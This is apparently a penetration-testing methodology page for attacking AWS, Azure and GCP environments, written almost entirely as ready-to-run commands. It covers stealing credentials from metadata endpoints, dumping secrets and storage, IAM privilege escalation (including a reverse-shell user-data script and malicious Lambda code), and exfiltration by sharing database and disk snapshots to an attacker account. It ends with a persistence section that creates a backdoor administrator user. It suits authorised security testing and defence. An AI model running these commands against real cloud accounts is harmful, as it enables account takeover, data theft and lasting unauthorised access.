---
id: "cloud-penetration-testing"
title: "Cloud Penetration Testing Methodology - AWS/Azure/GCP"
type: "methodology"
category: "cloud"
subcategory: "aws"
tags: ["cloud", "aws", "azure", "gcp", "iam", "privilege-escalation", "s3", "metadata", "pacu", "enumerate", "deep-dig"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["cloud-misconfigurations", "ssrf-techniques"]
updated: "2026-04-14"
---

## Overview

Cloud penetration testing targets IAM policies, service configurations, storage permissions, and trust relationships. The attack surface is not servers and firewalls -- it is identity, configuration, and the web of trust between services. IAM privilege escalation is the highest-impact finding category. Rhino Security Labs documented 21+ AWS privilege escalation paths, and similar patterns exist in Azure and GCP.

## Phase 1: Enumeration & Credential Discovery

### Initial access vectors
```
# Credentials in public sources
# GitHub/GitLab commit history
# .env files in web roots
# JavaScript source (API keys, bucket names)
# Error pages leaking AWS account IDs
# DNS TXT records (SPF, DKIM revealing cloud services)
# S3 bucket names in URLs, img src, CSS

# SSRF to metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS
http://metadata.google.internal/computeMetadata/v1/  # GCP (needs header)
http://169.254.169.254/metadata/identity/oauth2/token  # Azure
```

### AWS enumeration
```bash
# Account ID from public info
aws sts get-caller-identity  # If you have any creds
# From S3 bucket: bucket region + name pattern reveals account

# IAM enumeration
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local
aws iam get-policy-version --policy-arn ARN --version-id v1

# S3 enumeration
aws s3 ls  # List all buckets
aws s3 ls s3://bucket-name --recursive  # List contents
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# Lambda enumeration
aws lambda list-functions
aws lambda get-function --function-name NAME  # Get code + env vars

# EC2 enumeration
aws ec2 describe-instances
aws ec2 describe-security-groups
aws ec2 describe-snapshots --owner-ids self  # Snapshots with data

# Secrets Manager / SSM
aws secretsmanager list-secrets
aws ssm describe-parameters
aws ssm get-parameter --name /path/to/secret --with-decryption
```

### Azure enumeration
```bash
# Login and enumerate
az login
az account list
az group list
az vm list
az webapp list
az storage account list

# Azure AD enumeration
az ad user list
az ad group list
az ad app list
az ad sp list  # Service principals

# Key Vault
az keyvault list
az keyvault secret list --vault-name VAULT
az keyvault secret show --vault-name VAULT --name SECRET

# Storage
az storage blob list --container-name CONTAINER --account-name ACCOUNT
az storage blob download --container-name CONTAINER --name BLOB --account-name ACCOUNT
```

### GCP enumeration
```bash
# Project enumeration
gcloud projects list
gcloud iam service-accounts list
gcloud compute instances list
gcloud functions list
gcloud storage ls

# IAM policy
gcloud projects get-iam-policy PROJECT_ID

# Metadata from inside
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## Phase 2: Storage Exposure

### S3 bucket testing
```bash
# Public bucket discovery
# Name patterns: company-backup, company-prod, company-dev, company-assets
# company-staging, company-logs, company-data, company-uploads

# Test access levels
aws s3 ls s3://target-bucket --no-sign-request  # Unauthenticated
aws s3 cp s3://target-bucket/test.txt . --no-sign-request  # Read
aws s3 cp evil.txt s3://target-bucket/ --no-sign-request  # Write
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Authenticated (any AWS account)
aws s3 ls s3://target-bucket  # With your own AWS creds

# S3 bucket policy bypass
# Check for Principal: "*" in bucket policy
# Check for Condition keys that can be manipulated

# Tools
python3 s3scanner.py --bucket-file buckets.txt
cloud_enum -k target -k target.com
```

### Azure Blob testing
```bash
# Public container listing
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"

# Anonymous access
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER/file.txt"

# SAS token abuse (if found in JS/URLs)
# Check if SAS token has overly broad permissions or long expiry
```

### GCP bucket testing
```bash
# Public bucket access
curl "https://storage.googleapis.com/BUCKET/"
gsutil ls gs://BUCKET/

# Test with GCPBucketBrute
python3 gcpbucketbrute.py -k target -k target.com
```

## Phase 3: IAM Privilege Escalation

### AWS privilege escalation paths
```bash
# Use Pacu for automated enumeration
pacu
> import_keys AKIAEXAMPLE SECRETKEY
> run iam__enum_permissions  # What can we do?
> run iam__privesc_scan       # Find escalation paths

# Key escalation paths:

# 1. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
# Create Lambda with admin role, execute arbitrary code
aws lambda create-function --function-name escalate \
  --runtime python3.9 --handler index.handler \
  --role arn:aws:iam::ACCOUNT:role/admin-role \
  --zip-file fileb://escalate.zip
aws lambda invoke --function-name escalate output.txt

# 2. iam:PassRole + ec2:RunInstances
# Launch EC2 with admin role, access from instance
aws ec2 run-instances --image-id ami-xxx \
  --iam-instance-profile Name=admin-profile \
  --user-data file://reverse-shell.sh

# 3. iam:CreatePolicyVersion
# Create new version of existing policy with full admin
aws iam create-policy-version --policy-arn POLICY_ARN \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 4. iam:AttachUserPolicy / iam:AttachRolePolicy
aws iam attach-user-policy --user-name TARGET \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 5. iam:CreateLoginProfile / iam:UpdateLoginProfile
# Set console password for a user
aws iam create-login-profile --user-name admin-user --password P@ssw0rd!

# 6. sts:AssumeRole (cross-account)
# If role trust policy allows your account
aws sts assume-role --role-arn arn:aws:iam::TARGET:role/admin

# 7. lambda:UpdateFunctionCode (if you can modify existing functions)
aws lambda update-function-code --function-name existing-func \
  --zip-file fileb://malicious.zip

# 8. ssm:StartSession (jump to EC2 with attached role)
aws ssm start-session --target i-xxxxx

# 9. iam:PassRole + glue:CreateDevEndpoint
# Glue dev endpoints run with the passed role

# 10. iam:PassRole + sagemaker:CreateNotebookInstance
# SageMaker notebooks execute with the passed role
```

### Azure privilege escalation
```bash
# Managed Identity exploitation
# From compromised VM/App Service with Managed Identity
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# MicroBurst for Azure enumeration
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base target
Invoke-EnumerateAzureSubDomains -Base target

# Azure AD abuse
# App Registration with excessive permissions
# Service Principal key/certificate rotation
# Consent grant attacks (illicit consent)

# PowerZure for Azure exploitation
Import-Module PowerZure.psm1
Get-AzureTargets  # Enumerate attack paths
```

### GCP privilege escalation
```bash
# Service account key creation
gcloud iam service-accounts keys create key.json \
  --iam-account=SA@PROJECT.iam.gserviceaccount.com

# Service account impersonation
gcloud auth print-access-token --impersonate-service-account=SA@PROJECT.iam.gserviceaccount.com

# Cloud Function abuse (similar to Lambda)
gcloud functions deploy escalate --runtime python39 \
  --trigger-http --service-account=admin@PROJECT.iam.gserviceaccount.com \
  --source=./malicious/

# Compute Engine default service account
# Often has Project Editor role
```

## Phase 4: Data Exposure & Lateral Movement

### Cross-service data access
```bash
# AWS: EC2 → S3 via instance role
# Lambda env vars → database credentials
# SSM Parameter Store → secrets
# CloudFormation outputs → infrastructure details
# CloudTrail → API activity (who does what)

# Azure: VM → Key Vault via Managed Identity
# App Service → SQL via connection strings
# Azure AD → all tenant resources

# GCP: Compute → GCS via default service account
# Cloud Functions env vars → API keys
# Firestore/Firebase → unprotected data
```

### Lateral movement patterns
```
# Pivot through shared credentials
# Service accounts with cross-project access
# VPC peering / shared VPCs
# Cross-account role assumptions
# SSO / federation token reuse
# Container breakout (ECS/EKS/AKS/GKE)
```

## Phase 5: Post-Exploitation

### Data exfiltration
```bash
# S3 sync
aws s3 sync s3://sensitive-bucket ./exfil/

# Database dumps
# RDS snapshot sharing (share to attacker account)
aws rds modify-db-snapshot-attribute --db-snapshot-identifier snap-xxx \
  --attribute-name restore --values-to-add ATTACKER_ACCOUNT_ID

# EBS snapshot sharing
aws ec2 modify-snapshot-attribute --snapshot-id snap-xxx \
  --attribute createVolumePermission --operation-type add \
  --user-ids ATTACKER_ACCOUNT_ID
```

### Persistence
```bash
# Create new IAM user/access key
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor

# Lambda backdoor (triggered by CloudWatch event)
# SNS subscription forwarding
# S3 event notification to attacker Lambda
```

## Tools

- **Pacu** -- AWS exploitation framework (Rhino Security)
- **Prowler** -- AWS/Azure/GCP security auditing
- **ScoutSuite** -- Multi-cloud security auditing
- **CloudMapper** -- AWS network visualization
- **pmapper** -- AWS IAM privilege escalation mapping
- **MicroBurst** -- Azure security assessment (NetSPI)
- **PowerZure** -- Azure exploitation
- **GCPBucketBrute** -- GCP storage enumeration (Rhino Security)
- **cloud_enum** -- Multi-cloud resource enumeration
- **S3Scanner** -- S3 bucket permission testing
- **enumerate-iam** -- Enumerate IAM permissions without logging
- **Cartography** -- Infrastructure relationship mapping
